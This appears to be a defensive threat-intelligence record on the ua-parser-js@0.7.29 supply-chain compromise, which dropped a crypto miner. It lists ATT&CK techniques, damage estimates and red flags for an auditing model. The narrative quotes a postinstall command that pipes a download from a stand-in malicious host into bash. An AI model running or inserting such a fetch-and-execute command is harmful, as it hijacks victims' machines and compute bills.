---
node_type: chain
chain_name: crypto-miner
threat_actor_class: crypto_miner
technique_sequence:
  - T1195.002
  - T1059
  - T1041
depth: 3
observed_packages:
  - ua-parser-js@0.7.29
estimated_blast_radius_usd: 500000
insurance_rider: crypto_jacking_and_compute_fraud
preconditions:
  - postinstall script fetches and executes a remote binary
  - Download domain registered recently with no DNS history
  - Mining runs only during the install window (low persistence)
---

## Chain Narrative

### ua-parser-js@0.7.29
- [RECON] script_analysis: postinstall script executes curl -sL malicious.host | bash
- [RECON] domain_intel: Download domain registered 3 days before publish; no DNS history
- [EXPLOIT] sandbox_execution: Payload downloads xmrig miner disguised as 'prebuilds/linux/node'
- [EXPLOIT] persistence_check: No persistence  -  mines only during install window (~30-90 seconds)
- [POST-EX] blast_radius: Spike in cloud compute bills; average victim sees $200-2,000 unexpected ECG/GCP charges

## Preconditions for Auditor

Fields the auditor model should look for to elevate suspicion when this chain is partially matched.

- postinstall script fetches and executes a remote binary
- Download domain registered recently with no DNS history
- Mining runs only during the install window (low persistence)
